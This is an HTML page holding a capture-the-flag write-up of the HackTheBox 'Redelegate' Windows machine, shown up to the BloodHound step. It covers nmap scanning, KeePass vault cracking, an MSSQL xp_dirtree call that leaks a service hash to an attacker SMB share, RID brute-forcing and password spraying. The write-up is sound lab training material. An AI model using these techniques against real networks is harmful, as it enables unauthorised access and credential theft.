<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HackTheBox - Redelegate" />
<meta name="author" content="S4nity" />
<meta property="og:locale" content="en" />
<meta name="description" content="Redelegate is a hard Windows machine, that requires us to crack a password vault, which allows us to gain access to a SQL-server. The SQL-server allows us to bruteforce user RIDs to generate a user list. Password spraying allows us to find a user that re-used their password. The user has “ForceChangePassword” control over another user, who has “GenericAll” control over the machine account, which allows us to use “Constrained Delegation” to escalate our privileges." />
<meta property="og:description" content="Redelegate is a hard Windows machine, that requires us to crack a password vault, which allows us to gain access to a SQL-server. The SQL-server allows us to bruteforce user RIDs to generate a user list. Password spraying allows us to find a user that re-used their password. The user has “ForceChangePassword” control over another user, who has “GenericAll” control over the machine account, which allows us to use “Constrained Delegation” to escalate our privileges." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Redelegate/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Redelegate/" />
<meta property="og:site_name" content="Sanity-Archive" />
<meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-13T13:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png" />
<meta property="twitter:title" content="HackTheBox - Redelegate" />
<meta name="twitter:site" content="@" />
<meta name="twitter:creator" content="@S4nity" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-10-13T13:00:00+02:00","datePublished":"2025-10-13T13:00:00+02:00","description":"Redelegate is a hard Windows machine, that requires us to crack a password vault, which allows us to gain access to a SQL-server. The SQL-server allows us to bruteforce user RIDs to generate a user list. Password spraying allows us to find a user that re-used their password. The user has “ForceChangePassword” control over another user, who has “GenericAll” control over the machine account, which allows us to use “Constrained Delegation” to escalate our privileges.","headline":"HackTheBox - Redelegate","image":"https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Redelegate/"},"url":"http://localhost:4000/posts/HackTheBox-Redelegate/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HackTheBox - Redelegate | Sanity-Archive
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon.ico">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Sanity-Archive">
<meta name="application-name" content="Sanity-Archive">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>
  <script src="/assets/js/burger.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Sanity-Archive</a>
    <p class="site-subtitle fst-italic mb-0">Website for CTF, Pentesting and Redteaming topics</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100" style="display: none !important;">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/Sanity-Archive"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['',''].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HackTheBox - Redelegate</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar" onclick="burgerClick()">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HackTheBox - Redelegate</h1>
    
      <p class="post-desc fw-light mb-4">Redelegate is a hard Windows machine, that requires us to crack a password vault, which allows us to gain access to a SQL-server. The SQL-server allows us to bruteforce user RIDs to generate a user list. Password spraying allows us to find a user that re-used their password. The user has "ForceChangePassword" control over another user, who has "GenericAll" control over the machine account, which allows us to use "Constrained Delegation" to escalate our privileges.</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760353200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 13, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png" class="popup img-link preview-img shimmer"><img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://sanity-archive.github.io/">S4nity</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1434 words"
>
  <em>7 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HackTheBox - Redelegate</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HackTheBox - Redelegate</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>First we do a nmap scan to see which services are running on the system:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap.txt 10.129.234.50
&lt;...&gt;
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
&lt;...&gt;
53/tcp   open  domain        Simple DNS Plus
&lt;...&gt;
80/tcp   open  http          Microsoft IIS httpd 10.0
&lt;...&gt;
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-10-13 13:21:55Z<span class="o">)</span>
&lt;...&gt;
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
&lt;...&gt;
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: redelegate.vl0., Site: Default-First-Site-Name<span class="o">)</span>
&lt;...&gt;
445/tcp  open  microsoft-ds?
&lt;...&gt;
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
&lt;...&gt;
3389/tcp open  ms-wbt-server Microsoft Terminal Services
&lt;...&gt;
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>The server appears to be a DC with multiple interesting ports, like FTP, SMB, MSSQL, WinRM and RDP.
We can see that FTP allows Anonymous login, so let’s start here.</p>

<blockquote class="prompt-danger">
  <p>Do not skip, switching to binary mode! It ensures that every bit is transfered as is, without any conversions.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>ftp Anonymous@10.129.234.50
&lt;...&gt;
ftp <span class="nb">ls</span>
&lt;...&gt;
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
&lt;...&gt;
binary
&lt;...&gt;
mget <span class="k">*</span>
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>CyberAudit.txt might give us some hints on what to look out for:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>OCTOBER 2024 AUDIT FINDINGS

<span class="o">[!]</span> CyberSecurity Audit findings:

1<span class="o">)</span> Weak User Passwords
2<span class="o">)</span> Excessive Privilege assigned to <span class="nb">users
</span>3<span class="o">)</span> Unused Active Directory objects
4<span class="o">)</span> Dangerous Active Directory ACLs

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remediation steps:

1<span class="o">)</span> Prompt <span class="nb">users </span>to change their passwords: DONE
2<span class="o">)</span> Check privileges <span class="k">for </span>all <span class="nb">users </span>and remove high privileges: DONE
3<span class="o">)</span> Remove unused objects <span class="k">in </span>the domain: IN PROGRESS
4<span class="o">)</span> Recheck ACLs: IN PROGRESS
</pre></td></tr></tbody></table></code></div></div>

<p>TrainingAgenda.txt contains multiple cyber security company events. One of them is about how “SeasonYear!” is not a good password, which could mean that some users use something similar.
<br /><br />
Shared.kdbx is a keypass file that contains passwords. We can try to crack it via JohnTheRipper:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>kepass2john shared.kdbx <span class="o">&gt;</span> shared_hash
&lt;...&gt;
john shared_hash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>It seems to take really long, so we stop the process.<br /><br /></p>

<p>Let’s create a new wordlist based on the findings we saw earlier.
I created a small Python script to generate it:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">year</span> <span class="o">=</span> <span class="mi">1900</span>
<span class="n">seasons</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">Winter</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Spring</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Summer</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Autum</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Fall</span><span class="sh">"</span><span class="p">]</span>

<span class="k">with</span> <span class="nf">open </span><span class="p">(</span><span class="sh">"</span><span class="s">wordlist.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="k">while</span> <span class="n">year</span> <span class="o">&lt;</span> <span class="mi">2026</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">season</span> <span class="ow">in</span> <span class="n">seasons</span><span class="p">:</span>
                        <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">season</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">year</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">year</span> <span class="o">=</span> <span class="n">year</span> <span class="o">+</span><span class="mi">1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now, let’s try to crack the password again:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>john shared_hash <span class="nt">--wordlist</span><span class="o">=</span>wordlist.txt
&lt;...&gt;
<span class="k">***</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked!
Let’s open the file.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>keepass2 Shared.kdbx
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/post-images/redelegate/keepass_vault.jpg" class="popup img-link  shimmer"><img src="/post-images/redelegate/keepass_vault.jpg" alt="Keepass vault" loading="lazy"></a></p>

<p>We saw in the NMAP-scan from earlier, that MS-SQL is running on the System, so let’s try if the credentials work for the service:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>impacket-mssqlclient SQLGuest@10.129.234.50
&lt;...&gt;
Password:
&lt;...&gt;
SQL <span class="o">(</span>SQLGuest guest@master<span class="o">)</span>
&lt;...&gt;
SQL <span class="o">(</span>SQLGuest  guest@master<span class="o">)&gt;</span> enum_db
name     is_trustworthy_on   
<span class="nt">------</span>   <span class="nt">-----------------</span>   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
</pre></td></tr></tbody></table></code></div></div>

<p>The databases don’t seem to be promising, so I tried to get a cmdshell going:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>SQL <span class="o">(</span>SQLGuest  guest@master<span class="o">)&gt;</span> enable_xp_cmdshell
ERROR<span class="o">(</span>DC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 105: User does not have permission to perform this action.
</pre></td></tr></tbody></table></code></div></div>

<p>Then I tried to grab and crack the MSSQL service:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>impacket-smbserver share ./ <span class="nt">-smb2support</span>
&lt;...&gt;
<span class="c"># from a different terminal</span>
EXEC master..xp_dirtree <span class="s1">'\\10.10.10.10\share\'</span>
&lt;...&gt;
hashcat sqlSVC_hash /usr/share/wordlists/rockyou.txt
Status...........: Exhausted
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>After this didn’t work either, I switched to automated enumeration via Metasploit.</p>

<blockquote class="prompt-info">
  <p>This works by extracting the SID of the domain and then bruteforcing the RIDs of the user accounts.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>msfconsole
&lt;...&gt;
use auxiliary/admin/mssql/mssql_enum_domain_accounts
&lt;...&gt;
&lt;Usernames&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>I copied it over to a file called users_pre.txt and used “sed” to clean it up:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">cat </span>users_pre.txt | <span class="nb">sed</span> <span class="s1">'s/.*\\//'</span> <span class="o">&gt;</span> users.txt <span class="o">&amp;&amp;</span> <span class="nb">rm </span>users_pre.txt
</pre></td></tr></tbody></table></code></div></div>

<h2 id="gaining-a-foothold"><span class="me-2">Gaining a foothold</span><a href="#gaining-a-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>We saw in the audit results and in the training agenda from earlier that users might have bad passwords. So let’s try password spraying with the master password of the Keepass file.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>nxc smb 10.129.234.50 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'***'</span>
&lt;...&gt;
SMB         10.129.234.50   445    DC               <span class="o">[</span>+] redelegate.vl<span class="se">\M</span>arie.Curie:<span class="k">***</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I checked for any interesting SMB-shares, but there were none:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>nxc smb 10.129.234.50 <span class="nt">-u</span> Marie.Curie <span class="nt">-p</span> <span class="s1">'***'</span> <span class="nt">--shares</span>
&lt;...&gt;
SMB         10.129.234.50   445    DC               Share           Permissions     Remark
SMB         10.129.234.50   445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.234.50   445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.234.50   445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.129.234.50   445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.234.50   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.50   445    DC               SYSVOL          READ            Logon server share
</pre></td></tr></tbody></table></code></div></div>

<p>Next I used the account to collect all data for BloodHound:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
